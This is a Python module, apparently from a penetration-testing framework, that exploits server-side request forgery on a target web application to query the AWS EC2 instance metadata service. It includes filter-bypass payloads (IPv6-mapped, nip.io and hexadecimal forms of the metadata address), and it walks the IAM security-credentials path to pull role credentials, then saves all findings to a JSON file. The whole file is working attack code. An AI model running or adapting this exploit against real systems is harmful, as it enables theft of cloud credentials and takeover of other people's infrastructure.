"""SSRF to IMDS — exploit SSRF to reach EC2 Instance Metadata Service."""


import json
import os
import sys
from datetime import datetime, timezone, UTC
from typing import Any
from urllib.parse import urljoin

import requests


MANIFEST = {
    "capability_id": "cloudxpl.aws.ssrf_imds.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["http_requests_via_target"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1552.005"],
}

IMDS_V1_BASE = "http://169.254.169.254/latest/"
IMDS_PATHS = [
    "meta-data/",
    "meta-data/iam/security-credentials/",
    "meta-data/hostname",
    "meta-data/local-ipv4",
    "meta-data/public-ipv4",
    "meta-data/instance-id",
    "meta-data/instance-type",
    "dynamic/instance-identity/document",
    "user-data",
]


def _ssrf_fetch(target_url: str, imds_path: str, timeout: int = 10) -> str | None:
    imds_url = urljoin(IMDS_V1_BASE, imds_path)

    payloads = [
        imds_url,
        f"http://[::ffff:169.254.169.254]/latest/{imds_path}",
        f"http://169.254.169.254.nip.io/latest/{imds_path}",
        f"http://0xa9fea9fe/latest/{imds_path}",
    ]

    for payload in payloads:
        try:
            if "?" in target_url:
                url = f"{target_url}&url={payload}"
            else:
                url = f"{target_url}?url={payload}"

            resp = requests.get(url, timeout=timeout, allow_redirects=False)
            if resp.status_code == 200 and resp.text and "169.254.169.254" not in resp.text[:50]:
                return resp.text
        except requests.RequestException:
            continue
    return None


def run(args: Any) -> int:
    if not args.target:
        print("[!] --target URL required for SSRF-to-IMDS", file=sys.stderr)
        return 1

    print(f"[*] SSRF → IMDS via {args.target}")
    results: dict[str, Any] = {"target": args.target, "findings": {}}

    for path in IMDS_PATHS:
        data = _ssrf_fetch(args.target, path)
        if data:
            results["findings"][path] = data
            print(f"  [+] {path}: {data[:80]}{'...' if len(data) > 80 else ''}")

    creds_listing = results["findings"].get("meta-data/iam/security-credentials/")
    if creds_listing:
        for role in creds_listing.strip().split("\n"):
            role = role.strip()
            if role:
                cred_data = _ssrf_fetch(args.target, f"meta-data/iam/security-credentials/{role}")
                if cred_data:
                    results["findings"][f"credentials/{role}"] = cred_data
                    print(f"  [!] CREDENTIALS for role {role} extracted!")

    if results["findings"]:
        os.makedirs(args.output, exist_ok=True)
        ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
        out_path = os.path.join(args.output, f"ssrf_imds_{ts}.json")
        with open(out_path, "w") as fh:
            json.dump(results, fh, indent=2, default=str)
        print(f"[+] {len(results['findings'])} IMDS paths reached → {out_path}")
    else:
        print("[-] No IMDS data retrieved via SSRF")

    return 0
